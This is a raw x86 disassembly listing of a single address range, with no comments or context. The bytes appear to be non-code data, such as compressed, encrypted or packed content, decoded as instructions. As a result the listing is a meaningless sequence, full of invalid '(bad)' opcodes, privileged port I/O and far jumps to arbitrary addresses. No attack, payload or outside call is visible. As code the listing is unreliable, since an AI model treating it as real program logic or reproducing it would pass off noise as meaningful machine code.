  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	mov    ah,0x55
  4137f7:	jecxz  0x4137da
  4137f9:	in     eax,0xf8
  4137fb:	cli    
  4137fc:	adc    DWORD PTR [esi-0x63a90875],edx
  413802:	in     eax,0x62
  413804:	inc    edi
  413805:	das    
  413806:	and    bl,BYTE PTR [eax+0x19765862]
  41380c:	pop    ds
  41380d:	popf   
  41380e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41380f:	and    ch,BYTE PTR [ebx+0x324a1051]
  413815:	add    ebx,DWORD PTR [edi]
  413817:	cld    
  413818:	retf   0xf05
  41381b:	sub    al,0x9b
  41381d:	push   cs
  41381e:	loopne 0x413821
  413820:	dec    eax
  413821:	xor    eax,0xd851127a
  413827:	pop    edx
  413828:	mov    cl,0x47
  41382a:	lahf   
  41382b:	and    DWORD PTR [edi+0x27639167],0x7e
  413832:	sbb    al,0x3e
  413834:	xchg   esp,eax
  413835:	and    eax,0x42929ef2
  41383a:	out    dx,eax
  41383b:	and    ebp,DWORD PTR [ebx]
  41383d:	addr16 cmp eax,0x390a9dcb
  413843:	retf   
  413844:	cmp    ah,BYTE PTR [ebx-0x69]
  413847:	cmp    eax,0x69ddc865
  41384c:	sub    ebp,esp
  41384e:	sbb    DWORD PTR [eax+0x67],esi
  413851:	or     cl,BYTE PTR [ebx+esi*2+0x5ea00349]
  413858:	div    ebx
  41385a:	pop    esp
  41385b:	jecxz  0x4138d5
  41385d:	jmp    0x4137f8
  41385f:	(bad)  
  413860:	das    
  413861:	sar    DWORD PTR [edx],cl
  413863:	or     DWORD PTR [esi+0x2b408292],esi
  413869:	das    
  41386a:	les    edi,FWORD PTR [ebp-0x2f938d79]
  413870:	pop    esi
  413871:	jl     0x4138c7
  413873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413874:	push   edi
  413875:	mov    edx,0x222dfe99
  41387a:	and    BYTE PTR [edx+0x72],bl
  41387d:	jbe    0x41384b
  41387f:	pop    ecx
  413880:	lahf   
  413881:	ja     0x413858
  413883:	xchg   edx,eax
  413884:	mov    DWORD PTR [edi*1-0x9685f81],edx
  41388b:	fwait
  41388c:	aas    
  41388d:	mov    ah,0xb1
  41388f:	xor    DWORD PTR [ecx-0x5d],edx
  413892:	test   eax,0x3e128691
  413897:	in     al,0xae
  413899:	adc    ch,ah
  41389b:	in     al,dx
  41389c:	dec    ebx
  41389d:	and    al,0xd7
  41389f:	add    eax,0x6549052a
  4138a4:	and    ch,dh
  4138a6:	pop    edi
  4138a7:	or     DWORD PTR [eax-0x2f],ebp
  4138aa:	mov    bl,BYTE PTR [ebx]
  4138ac:	xor    eax,0x977175b7
  4138b1:	and    esp,DWORD PTR [ecx]
  4138b3:	sar    BYTE PTR [esi+esi*2+0x68],1
  4138b7:	popf   
  4138b8:	xor    BYTE PTR [ecx],bl
  4138ba:	xchg   esi,eax
  4138bb:	loope  0x413857
  4138bd:	mov    dh,0xa8
  4138bf:	retf   0x44d5
  4138c2:	xchg   esp,eax
  4138c3:	cld    
  4138c4:	int    0x5f
  4138c6:	or     eax,edx
  4138c8:	mov    bh,0xdf
  4138ca:	inc    esp
  4138cb:	sbb    BYTE PTR [edi-0x49],dl
  4138ce:	cwde   
  4138cf:	add    bh,dl
  4138d1:	pop    ebp
  4138d2:	or     eax,0x4610d5cc
  4138d7:	cmp    al,0xc7
  4138d9:	jmp    0x9528fbbf
  4138de:	shl    BYTE PTR [eax+0x54619796],cl
  4138e4:	test   eax,0xaf8669f5
  4138e9:	pushf  
  4138ea:	mov    cl,0x89
  4138ec:	lods   eax,DWORD PTR ss:[esi]
  4138ee:	push   ds
  4138ef:	dec    eax
  4138f0:	xchg   ebx,eax
  4138f1:	clc    
  4138f2:	aad    0x3c
  4138f4:	mov    cl,0x5e
  4138f6:	xchg   ebx,eax
  4138f7:	cs ins DWORD PTR es:[edi],dx
  4138f9:	jmp    0x413967
  4138fb:	in     eax,dx
  4138fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138fd:	aad    0x80
  4138ff:	ret    0x7d5
  413902:	cdq    
  413903:	mov    ecx,0xc3090da6
  413908:	std    
  413909:	pop    edi
  41390a:	popf   
  41390b:	ret    
  41390c:	sub    esp,ecx
  41390e:	cmp    DWORD PTR [edx-0x2b],ebx
  413911:	cmp    al,0x7d
  413913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413914:	mov    edi,0x5e02c73c
  413919:	dec    edi
  41391a:	jp     0x4138dd
  41391c:	repz aas 
  41391e:	pusha  
  41391f:	aam    0x4
  413921:	sar    BYTE PTR [eax],cl
  413923:	push   ds
  413924:	mov    ch,0x7d
  413926:	out    0xeb,eax
  413928:	fnsave [ebp-0x7627d51c]
  41392e:	mov    cl,0xbe
  413930:	iret   
  413931:	ret    
  413932:	daa    
  413933:	xor    eax,0x52ef6143
  413938:	call   0x2d4b:0xc0331129
  41393f:	addr16 push es
  413941:	mov    edx,0x476c7aa
  413946:	or     ch,BYTE PTR [ecx]
  413948:	stos   DWORD PTR es:[edi],eax
  413949:	aaa    
  41394a:	push   edi
  41394b:	inc    eax
  41394c:	mov    cl,0x8
  41394e:	fadd   QWORD PTR [edi-0x636b0caf]
  413954:	lods   al,BYTE PTR ds:[esi]
  413955:	cmp    dh,BYTE PTR [ebp-0x30]
  413958:	xchg   ebx,eax
  413959:	imul   ebx,DWORD PTR [edi+0xc],0x18
  41395d:	push   ds
  41395e:	fidivr WORD PTR [edx-0x47]
  413961:	retf   
  413962:	ret    
  413963:	adc    ebp,DWORD PTR [ecx+0x31]
  413966:	inc    ebp
  413967:	fild   DWORD PTR [eax]
  413969:	js     0x41397d
  41396b:	shl    DWORD PTR [eax+0xa],1
  41396e:	and    DWORD PTR [ebp-0xc],esi
  413971:	xchg   esp,eax
  413972:	dec    esp
  413973:	jl     0x413984
  413975:	out    dx,eax
  413976:	xor    edx,ebp
  413978:	aas    
  413979:	fdiv   st(5),st
  41397b:	and    esp,eax
  41397d:	xor    esp,ebx
  41397f:	cwde   
  413980:	jmp    0x764d4408
  413985:	pop    esp
  413986:	cmp    cl,BYTE PTR [ecx]
  413988:	cmp    DWORD PTR [esi-0x2b],ecx
  41398b:	les    ebp,FWORD PTR [edx]
  41398d:	jb     0x41396f
  41398f:	or     eax,0xb6c03ef2
  413994:	mov    ecx,ecx
  413996:	push   ecx
  413997:	ss ins DWORD PTR es:[edi],dx
  413999:	sbb    eax,0x2a5ca69f
  41399e:	push   ds
  41399f:	adc    BYTE PTR [edi],dl
  4139a1:	push   ebp
  4139a2:	push   esi
  4139a3:	rol    DWORD PTR [edi],0x4
  4139a6:	sar    BYTE PTR ds:0x2ba52835,cl
  4139ac:	xchg   esp,eax
  4139ad:	dec    esi
  4139ae:	dec    ebx
  4139af:	inc    esp
  4139b0:	fidiv  DWORD PTR [ebx]
  4139b2:	lods   al,BYTE PTR ds:[esi]
  4139b3:	mov    ah,0x70
  4139b5:	adc    dh,BYTE PTR [ecx-0x4cc4885f]
  4139bb:	shr    DWORD PTR [ecx],0x17
  4139be:	call   0x835e:0x5a7591e9
  4139c5:	and    esp,DWORD PTR [ebx-0x78930a4e]
  4139cb:	dec    edi
  4139cc:	mov    ah,BYTE PTR [ecx+0x1fa47a12]
  4139d2:	test   DWORD PTR [edi+0x1a],esp
  4139d5:	popa   
  4139d6:	dec    ebp
  4139d7:	or     al,BYTE PTR [edx+0x35]
  4139da:	(bad)  
  4139db:	jb     0x4139d0
  4139dd:	outs   dx,DWORD PTR ds:[esi]
  4139de:	mov    ds:0xffe660fc,al
  4139e3:	sub    al,0x8d
  4139e5:	pop    eax
  4139e6:	shr    BYTE PTR [esi],1
  4139e8:	add    dh,dl
  4139ea:	sbb    al,0xad
  4139ec:	nop
  4139ed:	mov    bl,0x19
  4139ef:	lahf   
  4139f0:	nop
  4139f1:	neg    BYTE PTR [ebx]
  4139f3:	icebp  
  4139f4:	mov    ebp,DWORD PTR [ebx-0xc]
  4139f7:	mov    edx,0x8e6e9154
  4139fc:	sbb    al,0x34
  4139fe:	imul   esi,DWORD PTR [eax],0xc1a32eca
  413a04:	shl    BYTE PTR [ecx+ebp*8+0x65844bb7],1
  413a0b:	and    eax,0x7ba78843
  413a10:	mov    dh,0xff
  413a12:	stos   BYTE PTR es:[edi],al
  413a13:	stos   BYTE PTR es:[edi],al
  413a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a15:	push   es
  413a16:	xchg   edi,eax
  413a17:	dec    eax
  413a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a19:	cmp    al,0xa8
  413a1b:	adc    eax,0x61947d17
  413a20:	es dec ebx
  413a22:	cmc    
  413a23:	test   BYTE PTR [esi+0x6d],bl
  413a26:	enter  0x83ba,0x59
  413a2a:	mov    cl,0x17
  413a2c:	cwde   
  413a2d:	mov    ss,WORD PTR [ecx-0x3a]
  413a30:	aad    0xec
  413a32:	int    0xc8
  413a34:	bound  edi,QWORD PTR [si-0x64]
  413a38:	and    DWORD PTR ds:0x6c50861c,0x8
  413a3f:	xor    ebx,DWORD PTR [ebx+0x31e64049]
  413a45:	mov    eax,edx
  413a47:	xor    BYTE PTR [ebx-0x27],0xf4
  413a4b:	dec    ecx
  413a4c:	ins    BYTE PTR es:[edi],dx
  413a4d:	fwait
  413a4e:	mov    ah,0xfd
  413a50:	and    ch,BYTE PTR [ecx+0xc748474]
  413a56:	inc    edx
  413a57:	dec    ebp
  413a58:	inc    edx
  413a59:	and    cl,BYTE PTR [esi-0x7167e031]
  413a5f:	iret   
  413a60:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413a62:	loopne 0x413a7f
  413a64:	ins    DWORD PTR es:[edi],dx
  413a65:	sub    eax,0x7030e5a5
  413a6a:	test   eax,0x7490f7b7
  413a6f:	pushf  
  413a70:	xchg   BYTE PTR [edi+eax*1+0x58],al
  413a74:	fdivr  QWORD PTR [ebp-0x2a]
  413a77:	mov    ebp,0x2e761f77
  413a7c:	(bad)  
  413a7e:	and    cl,BYTE PTR [edi+ebx*4-0x5e]
  413a82:	jge    0x413a9d
  413a84:	adc    dh,ch
  413a86:	jo     0x413a59
  413a88:	pop    ds
  413a89:	sbb    DWORD PTR [edi+0x1c0f340c],eax
  413a8f:	inc    edx
  413a90:	stos   BYTE PTR es:[edi],al
  413a91:	dec    ecx
  413a92:	mov    esp,0xbd302f99
  413a97:	rcl    DWORD PTR [esp+ebp*4-0xd],1
  413a9b:	retf   
  413a9c:	aaa    
  413a9d:	jecxz  0x413a93
  413a9f:	sub    ebp,ebx
  413aa1:	sub    DWORD PTR [edi+edx*1],edi
  413aa4:	test   ecx,edi
  413aa6:	fld    QWORD PTR [ebx]
  413aa8:	mov    bh,0x18
  413aaa:	dec    ebp
  413aab:	popa   
  413aac:	dec    esi
  413aad:	sbb    al,0xc2
  413aaf:	sbb    cl,BYTE PTR [edx-0x58af33e4]
  413ab5:	push   edx
  413ab6:	mov    al,0x6f
  413ab8:	xor    ch,BYTE PTR [ebx+0x4]
  413abb:	mov    ebx,0x18df4769
  413ac0:	icebp  
  413ac1:	xchg   edi,eax
  413ac2:	xor    BYTE PTR ds:0x1440a17e,ch
  413ac8:	repz (bad) 
  413aca:	int    0x69
  413acc:	push   esi
  413acd:	in     eax,0x6f
  413acf:	jmp    0xa0993634
  413ad4:	mov    al,ds:0x4dab2910
  413ad9:	scas   eax,DWORD PTR es:[edi]
  413ada:	out    dx,eax
  413adb:	and    edi,0xffffffcd
  413ade:	and    eax,0x74c5897d
  413ae3:	mul    DWORD PTR [ecx]
  413ae5:	jno    0x413b47
  413ae7:	ja     0x413a94
  413ae9:	adc    dl,BYTE PTR [edx+edi*4+0x4b96ffd4]
  413af0:	sti    
  413af1:	jnp    0x413aa8
  413af3:	ds fwait
  413af5:	aaa    
  413af6:	add    BYTE PTR [ecx+ebx*1],cl
  413af9:	nop
  413afa:	add    bh,bl
  413afc:	jo     0x413b67
  413afe:	pop    edx
  413aff:	dec    ebx
  413b00:	test   BYTE PTR [edx-0x4e73bff7],dh
  413b06:	ins    DWORD PTR es:[edi],dx
  413b07:	dec    edx
  413b08:	jle    0x413ac8
  413b0a:	mov    ss,WORD PTR [ecx-0x20]
  413b0d:	shl    BYTE PTR [eax+0x72537035],1
  413b13:	(bad)  
  413b14:	sahf   
  413b15:	outs   dx,DWORD PTR ds:[esi]
  413b16:	pop    edi
  413b17:	neg    BYTE PTR [eax+edx*1]
  413b1a:	repz xchg ebp,eax
  413b1c:	fwait
  413b1d:	xor    eax,0xe03d78ec
  413b22:	push   0x56
  413b24:	dec    ebp
  413b25:	sbb    DWORD PTR [edx-0x3b5ad24e],0xffffff8e
  413b2c:	lods   eax,DWORD PTR ds:[esi]
  413b2d:	shl    BYTE PTR [eax],cl
  413b2f:	mov    dl,0x84
  413b31:	jg     0x413ac6
  413b33:	fcomp  QWORD PTR [eax]
  413b35:	cmp    bh,BYTE PTR ds:0xd5877c13
  413b3b:	and    al,0xa5
  413b3d:	mov    eax,ds:0xa3cb7353
  413b42:	stos   DWORD PTR es:[edi],eax
  413b43:	cld    
  413b44:	xor    eax,eax
  413b46:	ds gs or eax,0x9e82f6b6
  413b4d:	in     eax,dx
  413b4e:	mov    ebp,DWORD PTR [ecx]
  413b50:	xchg   edi,eax
  413b51:	outs   dx,DWORD PTR ds:[esi]
  413b52:	inc    edx
  413b53:	push   DWORD PTR [eax+eiz*8]
  413b56:	retf   
  413b57:	lods   eax,DWORD PTR ds:[esi]
  413b58:	mov    ebp,cs
  413b5a:	jl     0x413bd1
  413b5c:	in     al,dx
  413b5d:	or     DWORD PTR [edi],0xf6b3b5c
  413b63:	adc    DWORD PTR [ebx],esp
  413b65:	xor    DWORD PTR [esi-0x6561da29],0x61cdc068
  413b6f:	stc    
  413b70:	in     eax,dx
  413b71:	xor    edx,esi
  413b73:	stc    
  413b74:	mov    cs,WORD PTR [ecx+0x76]
  413b77:	lods   eax,DWORD PTR ds:[esi]
  413b78:	and    BYTE PTR [edx+0x588103b0],bl
  413b7e:	cmc    
  413b7f:	cmc    
  413b80:	mov    esi,0x1cf31b82
  413b85:	jecxz  0x413ba0
  413b87:	sub    dl,BYTE PTR ds:0x83706827
  413b8d:	push   ss
  413b8e:	xor    esp,DWORD PTR [ebx-0x39]
  413b91:	mov    edx,0xf6237530
  413b96:	fnstcw WORD PTR [edi+0x31401bd6]
  413b9c:	cli    
  413b9d:	jb     0x413b43
  413b9f:	mov    ax,ds:0x23da8e3
  413ba5:	bound  eax,QWORD PTR [ebx]
  413ba7:	xlat   BYTE PTR ds:[ebx]
  413ba8:	in     al,0x0
  413baa:	jmp    0x413c05
  413bac:	cmc    
  413bad:	mov    DWORD PTR [edi+0x4e5d5a55],edx
  413bb3:	pop    ebx
  413bb4:	int3   
  413bb5:	lock outs dx,BYTE PTR ds:[esi]
  413bb7:	test   BYTE PTR [edi-0x2],ah
  413bba:	aaa    
  413bbb:	jg     0x413b3e
  413bbd:	mov    al,ds:0xda7e1102
  413bc2:	addr16 sbb bh,bh
  413bc5:	mov    eax,0x30429cce
  413bca:	loopne 0x413c1c
  413bcc:	push   ebx
  413bcd:	lods   eax,DWORD PTR ds:[esi]
  413bce:	xchg   ebp,eax
  413bcf:	sbb    eax,0xedb389b9
  413bd4:	test   eax,0xff483d84
  413bd9:	enter  0x66f8,0x59
  413bdd:	or     bh,dh
  413bdf:	mov    bl,0x32
  413be1:	push   ebx
  413be2:	ja     0x413c2c
  413be4:	ds mov edx,0x928e2107
  413bea:	dec    ebx
  413beb:	imul   ebp,DWORD PTR [esi+0x68],0x49efee44
  413bf2:	mov    dh,0xc1
  413bf4:	add    al,0x95
  413bf6:	fucom  st(6)
  413bf8:	in     al,0x8c
  413bfa:	mov    DWORD PTR [edx-0x3fe4e8b7],ebp
  413c00:	jg     0x413c03
  413c02:	and    eax,0xac4fbf48
  413c07:	pop    ebp
  413c08:	jbe    0x413c5b
  413c0a:	(bad)  [eax+0x6f]
  413c0d:	fnstenv [edx]
  413c0f:	(bad)  
  413c10:	in     al,dx
  413c11:	pop    edi
  413c12:	xor    BYTE PTR [edi],dh
  413c14:	sbb    ah,0xaa
  413c17:	call   0x34c9bb9f
  413c1c:	xchg   ebp,eax
  413c1d:	aaa    
  413c1e:	sub    eax,0xea8f893f
  413c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c24:	call   0x1ca97b9d
  413c29:	pop    edi
  413c2a:	dec    edi
  413c2b:	adc    BYTE PTR [ebx],bl
  413c2d:	pop    ecx
  413c2e:	out    0x2a,al
  413c30:	xor    DWORD PTR [esi+0x79],esi
  413c33:	inc    esp
  413c35:	jne    0xe397ab71
  413c3b:	hlt    
  413c3c:	into   
  413c3d:	ds cmp eax,0x605098bd
  413c43:	or     DWORD PTR [ecx-0xf],ebp
  413c46:	cld    
  413c47:	add    ecx,DWORD PTR [esi+0x1d49cbdb]
  413c4d:	xlat   BYTE PTR ds:[ebx]
  413c4e:	jmp    0x413c5e
  413c50:	ins    BYTE PTR es:[edi],dx
  413c51:	dec    edx
  413c52:	repz push esi
  413c54:	out    dx,al
  413c55:	xchg   esp,eax
  413c56:	and    BYTE PTR [ecx-0x56],bh
  413c59:	add    DWORD PTR [edx-0x4fb2026a],eax
  413c5f:	std    
  413c60:	mov    bl,0x3d
  413c62:	cmp    edx,ecx
  413c64:	cs ds (bad) 
  413c68:	out    0x63,al
  413c6a:	mov    BYTE PTR [eax+0x3],dh
  413c6d:	adc    al,BYTE PTR [ebx]
  413c6f:	ins    BYTE PTR es:[edi],dx
  413c70:	es xchg ecx,eax
  413c72:	add    ebp,DWORD PTR gs:[edx-0x57]
  413c76:	pusha  
  413c77:	sub    BYTE PTR [bx+di+0x2],cl
  413c7b:	dec    edx
  413c7c:	pop    esi
  413c7d:	sub    eax,0x1df141e9
  413c82:	lahf   
  413c83:	hlt    
  413c84:	(bad)  
  413c85:	jb     0x413cee
  413c87:	mov    eax,ds:0x4eb79c95
  413c8c:	dec    edx
  413c8d:	in     al,0x6d
  413c8f:	aas    
  413c90:	and    BYTE PTR [edx+0x69],0x78
  413c94:	sub    al,0x9e
  413c96:	fldcw  WORD PTR [edx-0x5f]
  413c99:	ja     0x413ce4
  413c9b:	sbb    edx,DWORD PTR [esi-0x24]
  413c9e:	fisub  DWORD PTR [edx-0x2c2912b1]
  413ca4:	mov    ds:0x4c9ce504,al
  413ca9:	jmp    0x83cbb58
  413cae:	push   esp
  413caf:	scas   al,BYTE PTR es:[edi]
  413cb0:	mov    bl,BYTE PTR [edi]
  413cb2:	inc    edi
  413cb3:	push   ebx
  413cb4:	cwde   
  413cb5:	sbb    BYTE PTR [esi],al
  413cb7:	ja     0x413cca
  413cb9:	push   ss
  413cba:	sub    al,0x67
  413cbc:	xchg   ecx,eax
  413cbd:	addr16 call 0x3053f34b
  413cc3:	out    0xb4,eax
  413cc5:	push   es
  413cc6:	pop    es
  413cc7:	ins    BYTE PTR es:[edi],dx
  413cc8:	outs   dx,DWORD PTR ds:[esi]
  413cc9:	(bad)
  413ccc:	jecxz  0x413cce
  413cce:	leave  
  413ccf:	mov    ecx,0x8f9d3b9
  413cd4:	mov    ss,WORD PTR [ecx-0x43]
  413cd7:	cmp    eax,0xbbfee4d
  413cdc:	push   edx
  413cdd:	retf   0xd377
  413ce0:	fistp  WORD PTR [edi+0x53bc6d10]
  413ce6:	addr16 jae 0x413c91
  413ce9:	inc    eax
  413cea:	rcl    BYTE PTR [esi],cl
  413cec:	or     eax,0x2a4299e5
  413cf1:	in     al,dx
  413cf2:	sbb    bh,dl
  413cf4:	cs inc eax
  413cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cf7:	xor    ch,cl
  413cf9:	push   0xccf0e889
  413cfe:	inc    esi
  413cff:	push   eax
  413d00:	(bad)  
  413d01:	(bad)  
  413d02:	stc    
  413d03:	add    al,0x9
  413d05:	cmp    cl,BYTE PTR [ebp+0x0]
  413d08:	call   0xdc934ebb
  413d0d:	out    dx,eax
  413d0e:	aam    0x12
  413d10:	xchg   ecx,eax
  413d11:	enter  0xf62d,0x94
  413d15:	gs pop ss
  413d17:	mov    ecx,0xe9d4db59
  413d1c:	leave  
  413d1d:	inc    ebx
  413d1e:	test   DWORD PTR [edx-0x7550a3c2],edi
  413d24:	retf   0xbc74
  413d27:	in     al,dx
  413d28:	xchg   ebx,eax
  413d29:	pop    eax
  413d2a:	fdivr  DWORD PTR [eax-0x58]
  413d2d:	adc    al,dl
  413d2f:	jge    0x413d6e
  413d31:	in     al,dx
  413d32:	jne    0x413ccd
  413d34:	inc    esi
  413d35:	sbb    BYTE PTR [esi+edi*2+0x32],cl
  413d39:	sbb    al,0x22
  413d3b:	sub    edi,DWORD PTR [ecx-0x579d12f]
  413d41:	or     esi,DWORD PTR [eax+ebx*1-0x18]
  413d45:	imul   esp,esi,0x4e
  413d48:	sbb    DWORD PTR [edx+edi*4-0x74],eax
  413d4c:	aas    
  413d4d:	sbb    eax,0xdbd106a
  413d52:	xchg   ecx,eax
  413d53:	bound  esp,QWORD PTR [ebx]
  413d55:	iret   
  413d56:	jne    0x413d39
  413d58:	ins    DWORD PTR es:[edi],dx
  413d59:	(bad)  
  413d5b:	adc    al,0x45
  413d5d:	mov    al,0xba
  413d5f:	fbstp  TBYTE PTR [ecx+0x7375c5a4]
  413d65:	sub    al,0x47
  413d67:	add    BYTE PTR ds:0xc4c81c21,bl
  413d6d:	add    dl,ah
  413d6f:	or     BYTE PTR [edx-0x10],bh
  413d72:	aad    0xbe
  413d74:	je     0x413cf9
  413d76:	dec    esi
  413d77:	mov    dh,0xad
  413d79:	xlat   BYTE PTR ds:[ebx]
  413d7a:	pop    ss
  413d7b:	in     al,dx
  413d7c:	in     al,0x74
  413d7e:	pop    eax
  413d7f:	or     eax,0xd5fac46d
  413d84:	rcr    BYTE PTR [ecx-0x79689aac],0x51
  413d8b:	scas   eax,DWORD PTR es:[edi]
  413d8c:	push   ss
  413d8d:	cs jae 0x413de8
  413d90:	(bad)  
  413d91:	jp     0x413d8c
  413d93:	push   ss
  413d94:	lods   al,BYTE PTR ds:[esi]
  413d95:	stos   BYTE PTR es:[edi],al
  413d96:	mov    cl,0x31
  413d98:	push   ds
  413d99:	adc    al,0xfa
  413d9b:	test   eax,0xa5576430
  413da0:	push   ss
  413da1:	inc    edi
  413da2:	rcr    DWORD PTR [eax+0x3497ad81],1
  413da8:	add    esi,ecx
  413daa:	xchg   edx,eax
  413dab:	jge    0x413d57
  413dad:	xor    ebx,DWORD PTR ds:0xc78ee213
  413db3:	pop    es
  413db4:	in     al,dx
  413db5:	test   al,0xd8
  413db7:	(bad)  
  413db8:	dec    ecx
  413db9:	jg     0x413d83
  413dbb:	cmp    ecx,edi
  413dbd:	cmp    al,0x63
  413dbf:	fwait
  413dc0:	push   ecx
  413dc1:	(bad)  
  413dc2:	aam    0x74
  413dc4:	in     al,dx
  413dc5:	add    ebx,DWORD PTR [esi-0xb82838e]
  413dcb:	push   0x7d
  413dcd:	and    BYTE PTR [eax],al
  413dcf:	push   0xbc796f37
  413dd4:	(bad)  [eax-0x2d]
  413dd7:	inc    ebx
  413dd8:	jecxz  0x413e07
  413dda:	stos   BYTE PTR es:[edi],al
  413ddb:	cmp    bl,BYTE PTR [ebx-0x647eea79]
  413de1:	add    ebp,DWORD PTR [ebx-0x22]
  413de4:	or     BYTE PTR [esp+eiz*2+0x376a21e1],0x10
  413dec:	add    BYTE PTR [edi+0x38],al
  413def:	cmp    ah,BYTE PTR [edx-0x47]
  413df2:	rcl    DWORD PTR [bx],cl
  413df5:	scas   al,BYTE PTR es:[edi]
  413df6:	fidivr DWORD PTR [ecx-0x3f]
  413df9:	adc    DWORD PTR [ecx+0x3d2d10f6],0x7d
  413e00:	adc    al,0x80
  413e02:	xor    DWORD PTR [ebp-0x7e],edi
  413e05:	mul    ch
  413e07:	repz xlat BYTE PTR es:[ebx]
  413e0a:	inc    esp
  413e0b:	out    dx,eax
  413e0c:	imul   esp,DWORD PTR [eax*2+0x562dc665],0xfffffff4
  413e14:	jge    0x413e32
  413e16:	data16 gs ja 0x413e35
  413e1a:	int    0x83
  413e1c:	fst    QWORD PTR [esi+0x4f]
  413e1f:	repnz lds ebp,FWORD PTR [eax-0x10dbc3d5]
  413e26:	mov    eax,0x66ba8a2
  413e2b:	inc    eax
  413e2c:	mov    bl,0x68
  413e2e:	mov    al,ds:0x4e30b319
  413e33:	xor    al,0xa7
  413e35:	stos   DWORD PTR es:[edi],eax
  413e36:	mov    BYTE PTR [eax+0x5925518c],cl
  413e3c:	test   DWORD PTR [ebx],esp
  413e3e:	stos   DWORD PTR es:[edi],eax
  413e3f:	js     0x413e5a
  413e41:	lock xor al,0xcd
  413e44:	sbb    al,0x9
  413e46:	test   DWORD PTR [eax-0x63e909fc],edi
  413e4c:	cmp    eax,0x39cbb20
  413e51:	scas   eax,DWORD PTR es:[edi]
  413e52:	push   es
  413e53:	and    eax,0x5a952ef8
  413e58:	test   al,0xfa
  413e5a:	and    bl,dl
  413e5c:	jmp    0x413e4d
  413e5e:	mul    BYTE PTR [eax+0x14686f6a]
  413e64:	dec    esi
  413e65:	mov    cl,0x95
  413e67:	cli    
  413e68:	jbe    0x413e7f
  413e6a:	ins    DWORD PTR es:[edi],dx
  413e6b:	daa    
  413e6c:	push   ebx
  413e6d:	int3   
  413e6e:	fdivp  st(2),st
  413e70:	lahf   
  413e71:	out    dx,eax
  413e72:	pop    esp
  413e73:	pop    ebp
  413e74:	push   es
  413e75:	sub    BYTE PTR [esi-0x6c],ch
  413e78:	sub    eax,0xb6a392e9
  413e7d:	ins    BYTE PTR es:[edi],dx
  413e7e:	mov    eax,ds:0x98e56f09
  413e83:	mov    ah,0x67
  413e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e86:	out    dx,al
  413e87:	inc    edi
  413e88:	adc    DWORD PTR [esi+0x2b],esi
  413e8b:	cmc    
  413e8c:	or     BYTE PTR [ebp+0x7c1fddc0],bh
  413e92:	rcr    DWORD PTR [edi],cl
  413e94:	not    DWORD PTR [edx+0x38]
  413e97:	ud0    eax,DWORD PTR [edi]
  413e9a:	push   ecx
  413e9b:	stos   BYTE PTR es:[edi],al
  413e9c:	dec    ebp
  413e9d:	jmp    0xc5fc:0x17a0103b
  413ea4:	mov    al,0x0
  413ea6:	jb     0x413e76
  413ea8:	mov    edi,0xce4d83f1
  413ead:	nop
  413eae:	ret    0x1c
  413eb1:	out    dx,al
  413eb2:	push   edi
  413eb3:	jns    0x413eac
  413eb5:	mov    dh,0xff
  413eb7:	je     0x413e98
  413eb9:	pop    ds
  413eba:	cmp    cl,al
  413ebc:	out    0x4b,al
  413ebe:	mov    cs,esi
  413ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ec1:	pop    ecx
  413ec2:	inc    edi
  413ec3:	and    DWORD PTR [ecx+0x32],ecx
  413ec6:	aas    
  413ec7:	scas   al,BYTE PTR es:[edi]
  413ec8:	das    
  413ec9:	mov    ecx,0x3d588035
  413ece:	cmp    al,BYTE PTR [ecx]
  413ed0:	into   
  413ed1:	add    DWORD PTR [edx],eax
  413ed3:	xor    esi,DWORD PTR [eax]
  413ed5:	aad    0xc8
  413ed7:	mov    esp,0xe17175e0
  413edc:	dec    esi
  413edd:	pop    ds
  413ede:	cdq    
  413edf:	or     ebx,esp
  413ee1:	(bad)  
  413ee2:	(bad)  
  413ee3:	test   BYTE PTR [edi+0x67c481dd],dh
  413ee9:	push   ebp
  413eeb:	xrelease xchg DWORD PTR [ebx-0x22a8eea2],ecx
  413ef2:	sub    BYTE PTR [eax],bl
  413ef4:	cwde   
  413ef5:	cli    
  413ef6:	(bad)  
  413ef8:	and    eax,0x73418ccc
  413efd:	jbe    0x413f57
  413eff:	push   ebx
  413f00:	jbe    0x413ee9
  413f02:	clc    
  413f03:	mov    edx,esi
  413f05:	mov    ebx,0x2402eaa9
  413f0a:	mov    ds:0x793be726,eax
  413f0f:	jle    0x413f19
  413f11:	dec    eax
  413f12:	mov    eax,0x63c63090
  413f17:	and    eax,0xc134071
  413f1c:	fdiv   st(4),st
  413f1e:	sbb    ah,BYTE PTR [edi+edx*2-0x1]
  413f22:	imul   eax,DWORD PTR [ecx+0x49e29715],0x1a0ca17f
  413f2c:	mov    edi,0xc93fb354
  413f31:	test   BYTE PTR [edx],ah
  413f33:	daa    
  413f34:	mov    cl,0x6d
  413f36:	fcomip st,st(4)
  413f38:	pusha  
  413f39:	xchg   esi,eax
  413f3a:	push   eax
  413f3b:	or     eax,esp
  413f3d:	xor    DWORD PTR [ebx-0x357a0304],0x9
  413f44:	(bad)
  413f48:	repz rol ch,1
  413f4b:	xor    eax,0xa7442013
  413f50:	sbb    esi,esi
  413f52:	(bad)
  413f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f57:	test   al,0xc3
  413f59:	retf   0xb470
  413f5c:	(bad)  
  413f5d:	push   DWORD PTR [edi+0x18f01e6b]
  413f63:	cs sbb ecx,0x68e6bb8f
  413f6a:	add    ebp,esi
  413f6c:	jecxz  0x413f9b
  413f6e:	repz mov esi,0x6000dfa2
  413f74:	mov    ds:0x2dd8ebcc,al
  413f79:	sbb    ecx,edi
  413f7b:	mov    ecx,0xa75b9515
  413f80:	loope  0x413f08
  413f82:	jecxz  0x413fdc
  413f84:	cs mov edi,0xba3852b6
  413f8a:	aad    0x8b
  413f8c:	gs jne 0x414009
  413f8f:	or     dh,BYTE PTR [edi+0x20]
  413f92:	mov    edi,0x634e91a7
  413f97:	push   es
